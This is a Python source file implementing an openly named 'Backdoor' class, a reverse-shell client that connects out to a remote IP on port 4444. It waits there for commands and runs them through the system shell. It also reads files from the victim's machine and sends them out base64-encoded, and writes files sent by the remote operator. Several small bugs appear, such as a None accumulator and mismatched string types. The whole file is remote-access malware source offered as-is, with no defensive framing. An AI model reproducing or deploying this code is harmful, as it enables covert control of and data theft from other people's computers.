#!/usr/bin/env python

import socket
import subprocess
import json
import os
import base64


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        self.connection.send("\n[+] Connection established.\n")

    def reliable_receive(self, json_data=None):
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    @staticmethod
    def stop():
        exit()

    def cd(self, command):
        return self.change_working_directory_to(command[1])

    @staticmethod
    def change_working_directory_to(path):
        os.chdir(path)
        return "[+] Changing working directory to %s" + path

    def download(self, command):
        return self.read_file(command[1])

    @staticmethod
    def read_file(path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def upload(self, command):
        return self.write_file(command[1], command[2])

    @staticmethod
    def write_file(path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload is successful."

    @staticmethod
    def execute_system_command(command):
        return subprocess.check_output(command, shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                commands = {"cd": self.cd, "download": self.download, "upload": self.upload}
                if command[0] == "exit":
                    break
                elif command[0] and len(command) > 1:
                    command_result = commands[command[0]](command)
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error during command execution."
            self.reliable_send(command_result)
        self.connection.close()


my_backdoor = Backdoor("ip", 4444)
my_backdoor.run()
